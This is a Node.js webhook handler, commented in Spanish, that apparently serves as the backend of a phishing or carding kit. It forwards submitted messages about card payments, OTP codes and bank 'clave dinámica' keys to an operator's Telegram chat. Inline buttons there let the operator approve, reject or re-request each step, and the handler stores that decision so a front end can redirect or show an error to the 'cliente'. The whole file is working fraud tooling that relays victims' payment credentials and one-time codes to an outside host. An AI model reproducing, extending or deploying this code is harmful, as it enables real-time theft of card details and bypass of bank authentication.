// api/webhook.js
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET;
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

const solicitudes = new Map();

// 📊 Rate limiting
const rateLimit = new Map();

function checkRateLimit(ip) {
    const now = Date.now();
    if (!rateLimit.has(ip)) {
        rateLimit.set(ip, { count: 1, time: now });
        return true;
    }
    
    const data = rateLimit.get(ip);
    if (now - data.time > 60000) {
        rateLimit.set(ip, { count: 1, time: now });
        return true;
    }
    
    if (data.count > 20) {
        return false;
    }
    
    data.count++;
    return true;
}

export default async function handler(req, res) {
    // ============================================
    // 1. CONFIGURAR CORS
    // ============================================
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-api-key');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // ============================================
    // 2. RATE LIMITING
    // ============================================
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    if (!checkRateLimit(ip)) {
        console.log('🚫 Rate limit excedido IP:', ip);
        return res.status(429).json({ 
            error: 'Demasiadas peticiones. Espera 1 minuto.'
        });
    }

    // ============================================
    // 3. GET - Configurar webhook
    // ============================================
    if (req.method === 'GET' && req.query.setup === 'true') {
        try {
            const protocol = req.headers['x-forwarded-proto'] || 'https';
            const host = req.headers.host;
            const webhookUrl = `${protocol}://${host}/api/webhook`;
            
            console.log('🔗 Configurando webhook en:', webhookUrl);
            
            await fetch(`${TELEGRAM_API}/deleteWebhook`);
            
            const response = await fetch(`${TELEGRAM_API}/setWebhook`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    url: webhookUrl,
                    allowed_updates: ['callback_query', 'message']
                })
            });

            const data = await response.json();
            console.log('✅ Webhook configurado:', data);
            
            return res.status(200).json({
                success: true,
                webhookUrl: webhookUrl,
                telegramResponse: data
            });
        } catch (error) {
            console.error('❌ Error configurando webhook:', error);
            return res.status(500).json({ error: 'Error configurando webhook' });
        }
    }

    // ============================================
    // 4. GET - Verificar estado de solicitud
    // ============================================
    if (req.method === 'GET' && req.query.check) {
        const solicitudId = req.query.check;
        const solicitud = solicitudes.get(solicitudId);
        
        if (solicitud) {
            console.log(`📊 Estado de ${solicitudId}:`, solicitud.estado);
            return res.status(200).json({ 
                solicitudId: solicitudId,
                estado: solicitud.estado || 'pending',
                timestamp: solicitud.timestamp
            });
        }
        
        return res.status(200).json({ 
            solicitudId: solicitudId,
            estado: 'pending'
        });
    }

    // ============================================
    // 5. POST - Procesar mensajes
    // ============================================
    if (req.method === 'POST') {
        try {
            const body = req.body;
            console.log('📨 POST recibido de IP:', ip);

            // ============================================
            // CASO 1: Mensaje con botones (Visa, Mastercard, etc.)
            // ============================================
            if (body.mensaje && body.solicitudId && body.botones) {
                console.log('📨 Mensaje con botones:', body.solicitudId);
                
                // Guardar solicitud como pendiente
                solicitudes.set(body.solicitudId, {
                    estado: 'pending',
                    timestamp: Date.now()
                });
                
                const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: body.mensaje,
                        parse_mode: 'Markdown',
                        reply_markup: body.botones,
                        disable_web_page_preview: true
                    })
                });

                const data = await response.json();
                console.log('📨 Respuesta de Telegram:', data.ok);

                if (data.ok) {
                    return res.status(200).json({ 
                        success: true,
                        messageId: data.result.message_id
                    });
                } else {
                    console.error('❌ Error:', data.description);
                    return res.status(500).json({ 
                        success: false, 
                        error: data.description 
                    });
                }
            }

            // ============================================
            // CASO 2: Mensaje simple (sin solicitudId)
            // ============================================
            if (body.mensaje && !body.solicitudId) {
                console.log('📨 Mensaje simple:', body.mensaje);
                
                const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: `📝 ${body.mensaje}`,
                        parse_mode: 'Markdown'
                    })
                });

                const data = await response.json();
                console.log('📨 Enviado a Telegram:', data.ok);

                return res.status(200).json({
                    success: data.ok,
                    message: data.ok ? 'Mensaje enviado' : 'Error enviando mensaje'
                });
            }

            // ============================================
            // CASO 3: Callback query (botón presionado en Telegram)
            // ============================================
            if (body.callback_query) {
                const callbackData = body.callback_query.data;
                const callbackId = body.callback_query.id;
                const message = body.callback_query.message;
                const chatId = message.chat.id;
                const messageId = message.message_id;
                const originalText = message.text || '';
                
                console.log('🔘 Callback recibido:', callbackData);
                
                // ============================================
                // DETECTAR TIPO DE ACCIÓN y extraer ID
                // ============================================
                let action = '';
                let solicitudId = '';
                
                // ✅ APROBAR (visa, master, amex, o genérico)
                if (callbackData.startsWith('approve_') || 
                    callbackData.startsWith('approve_visa_') || 
                    callbackData.startsWith('approve_master_') || 
                    callbackData.startsWith('approve_amex_')) {
                    action = 'approved';
                    solicitudId = callbackData.replace(/approve(_visa|_master|_amex)?_/, '');
                }
                // ❌ RECHAZAR
                else if (callbackData.startsWith('reject_') || 
                         callbackData.startsWith('reject_visa_') || 
                         callbackData.startsWith('reject_master_') || 
                         callbackData.startsWith('reject_amex_')) {
                    action = 'rejected';
                    solicitudId = callbackData.replace(/reject(_visa|_master|_amex)?_/, '');
                }
                // 📱 OTP
                else if (callbackData.startsWith('aprobar_otp_')) {
                    action = 'aprobar_otp';
                    solicitudId = callbackData.replace('aprobar_otp_', '');
                }
                else if (callbackData.startsWith('rechazar_otp_')) {
                    action = 'rechazar_otp';
                    solicitudId = callbackData.replace('rechazar_otp_', '');
                }
                else if (callbackData.startsWith('pedir_otp_')) {
                    action = 'pedir_otp';
                    solicitudId = callbackData.replace('pedir_otp_', '');
                }
                // 🔑 CLAVE DINÁMICA
                else if (callbackData.startsWith('aprobar_clave_din_')) {
                    action = 'aprobar_clave_din';
                    solicitudId = callbackData.replace('aprobar_clave_din_', '');
                }
                else if (callbackData.startsWith('rechazar_clave_din_')) {
                    action = 'rechazar_clave_din';
                    solicitudId = callbackData.replace('rechazar_clave_din_', '');
                }
                else if (callbackData.startsWith('pedir_clave_din_')) {
                    action = 'pedir_clave_din';
                    solicitudId = callbackData.replace('pedir_clave_din_', '');
                }
                // ❌ ERRORES
                else if (callbackData.startsWith('error_credenciales_')) {
                    action = 'error_credenciales';
                    solicitudId = callbackData.replace('error_credenciales_', '');
                }
                else {
                    console.log('⚠️ Callback no reconocido:', callbackData);
                    return res.status(200).json({ success: true });
                }

                console.log(`📌 Acción: ${action}, ID: ${solicitudId}`);

                // ============================================
                // GUARDAR ESTADO DE LA SOLICITUD
                // ============================================
                if (solicitudId) {
                    solicitudes.set(solicitudId, {
                        estado: action,
                        timestamp: Date.now()
                    });
                    console.log(`✅ Solicitud ${solicitudId} -> ${action}`);
                }

                // ============================================
                // RESPONDER AL CALLBACK QUERY (desaparece el botón)
                // ============================================
                let respuestaTexto = '';
                if (action === 'approved') respuestaTexto = '✅ Pago aprobado';
                else if (action === 'rejected') respuestaTexto = '❌ Pago rechazado';
                else if (action === 'aprobar_otp') respuestaTexto = '✅ OTP aprobado';
                else if (action === 'rechazar_otp') respuestaTexto = '❌ OTP rechazado';
                else if (action === 'aprobar_clave_din') respuestaTexto = '✅ Clave Dinámica aprobada';
                else if (action === 'rechazar_clave_din') respuestaTexto = '❌ Clave Dinámica rechazada';
                else respuestaTexto = '✅ Procesado';

                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackId,
                        text: respuestaTexto,
                        show_alert: false
                    })
                });

                // ============================================
                // ACTUALIZAR MENSAJE EN TELEGRAM (quitar botones)
                // ============================================
                let newText = originalText;
                // Reemplazar el estado en el mensaje
                const estadoRegex = /⏳ \*Estado:\* .+/;
                const estadoMsg = {
                    'approved': '✅ *APROBADO* - Redirigiendo al cliente',
                    'rejected': '❌ *RECHAZADO* - Mostrar error al cliente',
                    'aprobar_otp': '✅ *OTP APROBADO*',
                    'rechazar_otp': '❌ *OTP RECHAZADO*',
                    'aprobar_clave_din': '✅ *CLAVE DINÁMICA APROBADA*',
                    'rechazar_clave_din': '❌ *CLAVE DINÁMICA RECHAZADA*',
                    'error_credenciales': '❌ *ERROR CREDENCIALES*'
                };

                if (estadoRegex.test(newText)) {
                    newText = newText.replace(estadoRegex, `⏳ *Estado:* ${estadoMsg[action] || respuestaTexto}`);
                } else {
                    newText += `\n\n⏳ *Estado:* ${estadoMsg[action] || respuestaTexto}`;
                }

                // Editar mensaje SIN botones
                await fetch(`${TELEGRAM_API}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        message_id: messageId,
                        text: newText,
                        parse_mode: 'Markdown'
                    })
                });

                console.log(`✅ Mensaje actualizado en Telegram`);

                return res.status(200).json({ 
                    success: true, 
                    action: action,
                    solicitudId: solicitudId
                });
            }

            return res.status(400).json({ error: 'Mensaje inválido' });

        } catch (error) {
            console.error('❌ Error procesando webhook:', error);
            return res.status(500).json({ error: 'Error interno del servidor' });
        }
    }

    return res.status(405).json({ error: 'Método no permitido' });
}
